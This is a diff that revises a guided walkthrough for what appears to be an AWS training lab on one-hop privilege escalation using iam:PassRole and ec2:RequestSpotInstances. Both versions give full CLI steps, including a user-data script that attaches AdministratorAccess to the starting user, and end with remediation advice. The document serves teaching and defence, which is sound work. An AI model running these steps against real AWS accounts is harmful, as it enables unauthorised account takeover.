@@ -1,81 +1,86 @@
 # Guided Walkthrough: One-Hop Privilege Escalation via iam:PassRole + ec2:RequestSpotInstances
 
-This scenario demonstrates a privilege escalation vulnerability where a user has permission to pass IAM roles to EC2 Spot Instances (`iam:PassRole`) and request EC2 Spot Instances (`ec2:RequestSpotInstances`). The attacker, starting with these permissions, launches an EC2 Spot Instance with an administrative instance profile, and uses the instance's user-data script to attach the AdministratorAccess managed policy directly to the starting user. Once the policy is attached, the attacker gains full administrator access.
+This scenario demonstrates a privilege escalation vulnerability where an IAM user holds two permissions that seem unremarkable in isolation: `iam:PassRole` and `ec2:RequestSpotInstances`. Together they form a reliable one-hop path to full administrative access. The attacker launches a Spot Instance with an admin IAM role attached and embeds a user-data script that runs at boot time under the admin role's credentials -- calling `iam:AttachUserPolicy` to grant `AdministratorAccess` directly to the starting user.
 
-EC2 Spot Instances are spare compute capacity available at significantly discounted rates (up to 90% off On-Demand prices). While this makes them cost-effective for attackers executing privilege escalation, the underlying security vulnerability is identical to the standard `ec2:RunInstances` technique. Security teams must understand that restricting `ec2:RunInstances` alone is insufficient — they must also restrict `ec2:RequestSpotInstances` to prevent the same attack vector.
+The technique is subtle because `ec2:RequestSpotInstances` is frequently overlooked as an escalation vector. Security teams often apply controls to `ec2:RunInstances` but forget that Spot Instance requests accept identical launch specifications, including instance profiles and user-data. From an IAM policy standpoint, the two APIs are functionally equivalent for this attack.
 
-This technique is particularly dangerous because it combines IAM permissions with compute service actions, allowing an attacker to leverage temporary, low-cost compute resources to modify persistent IAM configurations. Even though this involves multiple AWS API calls (PassRole, RequestSpotInstances, AttachUserPolicy), it's classified as one-hop because there is only one principal traversal: from the starting user to admin privileges via the Spot Instance as an intermediary mechanism.
+This attack pattern also avoids the need to log into or directly interact with the EC2 instance. The entire escalation happens server-side: the user-data script runs automatically at boot, performs a single IAM API call with the instance's admin credentials, and then the instance can be discarded. There is no SSH, no SSM session, no interaction with the running instance required once the Spot request is submitted.
 
 ## The Challenge
 
-You start as `pl-prod-ec2-004-to-admin-starting-user`, an IAM user with two key permissions:
-- `iam:PassRole` scoped to `arn:aws:iam::*:role/pl-prod-ec2-004-to-admin-target-role`
-- `ec2:RequestSpotInstances` on all resources
+You have obtained credentials for `pl-prod-ec2-004-to-admin-starting-user` -- a low-privilege IAM user with two specific permissions: `iam:PassRole` (scoped to the target admin role) and `ec2:RequestSpotInstances`. Your goal is to escalate to effective administrator access in this AWS account.
 
-Your goal is to escalate to full administrator access using these permissions. The `pl-prod-ec2-004-to-admin-target-role` is an administrative role that trusts `ec2.amazonaws.com`, meaning it can be attached to an EC2 instance via an instance profile. The trick is getting that role's credentials to do your bidding — and user-data scripts run on first boot with access to exactly those credentials.
-
-Credentials for `pl-prod-ec2-004-to-admin-starting-user` are available from Terraform outputs.
-
-## Reconnaissance
-
-First, let's confirm your identity and verify the limited starting permissions:
+Start by confirming your identity and verifying that you genuinely don't have admin access yet:
 
 ```bash
-aws sts get-caller-identity --query 'Arn' --output text
-# arn:aws:iam::<account_id>:user/pl-prod-ec2-004-to-admin-starting-user
+export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
+export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
+unset AWS_SESSION_TOKEN
+
+aws sts get-caller-identity
 ```
 
-Confirm you can't yet list IAM users (no admin access):
+You should see yourself operating as `pl-prod-ec2-004-to-admin-starting-user`. Confirm that admin-level calls are blocked:
 
 ```bash
 aws iam list-users --max-items 1
-# An error occurred (AccessDenied) when calling the ListUsers operation
+# AccessDenied
 ```
 
-Good. Now discover what you have to work with. Find the instance profile that wraps the admin role:
+Good -- no admin access yet. Now let's find the path.
 
-```bash
-aws iam list-instance-profiles \
-  --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-004`)].{Name:InstanceProfileName, Arn:Arn}'
-```
+## Reconnaissance
 
-This reveals `pl-prod-ec2-004-to-admin-instance-profile`. You can also confirm the role attached to it carries administrative permissions:
+Your starting user has `iam:ListRoles` and `iam:ListInstanceProfiles` as helpful permissions. Use them to understand the landscape.
+
+First, look for roles in this account that could be passed to an EC2 instance:
 
 ```bash
 aws iam list-roles \
-  --query 'Roles[?contains(RoleName, `ec2-004`)].{Name:RoleName, Arn:Arn}'
+  --query 'Roles[?contains(RoleName, `ec2-004`)].{Name:RoleName,Arn:Arn}' \
+  --output table
 ```
 
-Grab your account ID and look up a suitable AMI and subnet for the instance launch:
+You'll find `pl-prod-ec2-004-to-admin-target-role`. Now check if there is an instance profile wrapping it -- instance profiles are the bridge between IAM roles and EC2 instances:
 
 ```bash
-# Get account ID
-ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
-
-# Find a current Amazon Linux 2023 AMI
-AMI_ID=$(aws ec2 describe-images \
-    --owners amazon \
-    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
-    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
-    --output text)
-
-# Find the default VPC subnet
-DEFAULT_VPC=$(aws ec2 describe-vpcs \
-    --filters "Name=is-default,Values=true" \
-    --query 'Vpcs[0].VpcId' --output text)
-
-DEFAULT_SUBNET=$(aws ec2 describe-subnets \
-    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
-    --query 'Subnets[0].SubnetId' --output text)
+aws iam list-instance-profiles \
+  --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-004`)].{Name:InstanceProfileName,Arn:Arn}' \
+  --output table
 ```
+
+There it is: `pl-prod-ec2-004-to-admin-instance-profile`. This instance profile wraps the admin role and is what you'll reference when launching the Spot Instance.
+
+Before you can launch the instance, you need two more pieces of infrastructure information: an AMI ID and a subnet. Pull the latest Amazon Linux 2023 AMI and a subnet from the default VPC:
+
+```bash
+# Find the most recent Amazon Linux 2023 AMI
+aws ec2 describe-images \
+  --owners amazon \
+  --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
+  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
+  --output text
+
+# Get the default VPC
+aws ec2 describe-vpcs \
+  --filters "Name=is-default,Values=true" \
+  --query 'Vpcs[0].VpcId' \
+  --output text
+
+# Get a subnet in that VPC
+aws ec2 describe-subnets \
+  --filters "Name=vpc-id,Values=<default-vpc-id>" \
+  --query 'Subnets[0].SubnetId' \
+  --output text
+```
+
+Note down the AMI ID and subnet ID -- you will need them when constructing the Spot Instance launch specification.
 
 ## Exploitation
 
-The key insight: if you can request a Spot Instance with an admin instance profile, and you control the user-data script that runs at boot, you can use the admin role's credentials to modify your own IAM permissions — all without ever directly assuming the role.
+Now you have everything you need. The attack has two logical steps: craft a malicious user-data script, then submit the Spot Instance request with the admin instance profile attached.
 
-### Step 1: Craft the user-data backdoor
-
-Write a script that attaches `AdministratorAccess` to your starting user. This script will execute at instance boot time using the credentials of the admin role attached to the instance profile:
+The user-data script is the payload. It runs automatically when the instance boots, under the credentials of the instance profile role -- the admin role. One AWS CLI call is all it needs:
 
 ```bash
 STARTING_USER="pl-prod-ec2-004-to-admin-starting-user"
@@ -90,7 +95,7 @@ sleep 15
 
 # Attach AdministratorAccess policy to the starting user
 aws iam attach-user-policy \
-  --user-name ${STARTING_USER} \
+  --user-name \$STARTING_USER_NAME \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 
 echo "AdministratorAccess attached successfully"
@@ -100,16 +105,14 @@ EOF
 USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
 ```
 
-### Step 2: Build the launch specification
-
-Spot Instances require a launch specification JSON rather than individual flags:
+The 15-second sleep gives the instance time to fully initialize and the instance profile credentials to become available via IMDS. Now construct the launch specification and submit the Spot request:
 
 ```bash
 INSTANCE_PROFILE="pl-prod-ec2-004-to-admin-instance-profile"
 
 LAUNCH_SPEC=$(cat <<EOF
 {
-  "ImageId": "$AMI_ID",
+  "ImageId": "<ami-id>",
   "InstanceType": "t3.micro",
   "IamInstanceProfile": {
     "Name": "$INSTANCE_PROFILE"
@@ -118,93 +121,56 @@ LAUNCH_SPEC=$(cat <<EOF
   "NetworkInterfaces": [
     {
       "DeviceIndex": 0,
-      "SubnetId": "$DEFAULT_SUBNET",
+      "SubnetId": "<subnet-id>",
       "AssociatePublicIpAddress": true
     }
   ]
 }
 EOF
 )
+
+aws ec2 request-spot-instances \
+  --spot-price "0.05" \
+  --instance-count 1 \
+  --type one-time \
+  --launch-specification "$LAUNCH_SPEC" \
+  --output json
 ```
 
-### Step 3: Request the Spot Instance
-
-This is the critical API call — `ec2:RequestSpotInstances` combined with `iam:PassRole`. You pass the admin instance profile to the Spot Instance, and AWS will launch it when capacity is available:
+Note the `SpotInstanceRequestId` from the output. The Spot fleet now has your request and will fulfill it within seconds to a minute or two. Poll for fulfillment:
 
 ```bash
-SPOT_OUTPUT=$(aws ec2 request-spot-instances \
-    --spot-price "0.05" \
-    --instance-count 1 \
-    --type "one-time" \
-    --launch-specification "$LAUNCH_SPEC" \
-    --output json)
-
-SPOT_REQUEST_ID=$(echo "$SPOT_OUTPUT" | jq -r '.SpotInstanceRequests[0].SpotInstanceRequestId')
-echo "Spot Request ID: $SPOT_REQUEST_ID"
+aws ec2 describe-spot-instance-requests \
+  --spot-instance-request-ids <spot-request-id> \
+  --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \
+  --output text
 ```
 
-### Step 4: Wait for fulfillment
-
-Poll until the Spot Instance is running. Spot requests are typically fulfilled within 1-2 minutes:
+Once the state is `active` and the code is `fulfilled`, you have an instance ID. The instance is now booting. Wait another 2-3 minutes for the user-data script to execute, then check IAM:
 
 ```bash
-while true; do
-    STATUS=$(aws ec2 describe-spot-instance-requests \
-        --spot-instance-request-ids "$SPOT_REQUEST_ID" \
-        --query 'SpotInstanceRequests[0].{State:State,Code:Status.Code,InstanceId:InstanceId}' \
-        --output json)
-
-    STATE=$(echo "$STATUS" | jq -r '.State')
-    if [ "$STATE" = "active" ]; then
-        INSTANCE_ID=$(echo "$STATUS" | jq -r '.InstanceId')
-        echo "Instance launched: $INSTANCE_ID"
-        break
-    fi
-    echo -n "."
-    sleep 10
-done
+aws iam list-attached-user-policies \
+  --user-name pl-prod-ec2-004-to-admin-starting-user \
+  --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
+  --output text
 ```
 
-### Step 5: Wait for the user-data script to run
-
-Once the instance is launched, wait for it to boot and execute the user-data script. Poll IAM for the policy attachment — this typically completes within 2-3 minutes:
-
-```bash
-while true; do
-    POLICY=$(aws iam list-attached-user-policies \
-        --user-name "$STARTING_USER" \
-        --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
-        --output text 2>/dev/null)
-
-    if [ "$POLICY" = "AdministratorAccess" ]; then
-        echo "AdministratorAccess attached!"
-        break
-    fi
-    echo -n "."
-    sleep 10
-done
-```
+Keep polling until `AdministratorAccess` appears in the output.
 
 ## Verification
 
-Now verify that your starting user has administrator access:
+Confirm that your original starting user credentials now have admin access -- no role assumption, no session token exchange:
 
 ```bash
-# Re-export starting user credentials
-export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
-export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
-unset AWS_SESSION_TOKEN
-
-# List IAM users — this requires admin access
 aws iam list-users --max-items 3 --output table
 ```
 
-If the table renders successfully, the escalation is complete. You went from a user who couldn't even list IAM users to one who can call any AWS API.
+It works. You did not need to assume a role, grab temporary credentials, or interact with the running instance. Your original IAM user now has `AdministratorAccess` attached directly, and it persists until explicitly removed.
 
 ## What Happened
 
-The attack exploited two permissions that are rarely considered dangerous on their own: the ability to pass a role to EC2 and the ability to request Spot Instances. Together, they form a complete privilege escalation path.
+You started with two narrow-looking permissions -- `iam:PassRole` and `ec2:RequestSpotInstances` -- and turned them into full account compromise without ever touching a running instance interactively. The Spot Instance was the weapon: it ran code server-side with administrative credentials, modified IAM on your behalf, and could be discarded immediately afterward.
 
-The Spot Instance acted as an intermediary: it booted with the admin role's credentials available via IMDS, and the user-data script used those credentials to permanently modify the starting user's IAM policies. The instance was ephemeral — it only needed to exist long enough to run the backdoor — but the IAM change it made is persistent.
+The root cause is the trusted relationship between EC2 compute and IAM: when you attach an IAM role to an EC2 instance, any code running on that instance inherits the role's permissions. User-data scripts execute at boot with full instance profile access. An attacker who can choose which role gets attached (via `iam:PassRole`) and can launch compute (via `ec2:RequestSpotInstances` or `ec2:RunInstances`) can chain these two capabilities into a privilege escalation path that bypasses all of the normal IAM boundaries protecting the admin role.
 
-This is identical in effect to the `ec2:RunInstances` escalation path (ec2-001), which is why "deny RunInstances" is an incomplete defense. Any API that can launch compute with an attached IAM role and user-data support can be exploited the same way. Security policies must explicitly restrict `ec2:RequestSpotInstances` alongside `ec2:RunInstances` to close this gap.
+In real environments, this pattern appears whenever developers are granted Spot Instance launch permissions for cost-saving workloads, combined with a `PassRole` that targets a role broader than strictly necessary. The fix is straightforward: restrict `iam:PassRole` to only the roles a principal actually needs to pass, scope Spot and RunInstances permissions with conditions that prevent them from being used with privileged instance profiles, and enforce IAM permission boundaries so that even if an instance runs admin-level code, it cannot modify the calling user's own policies.
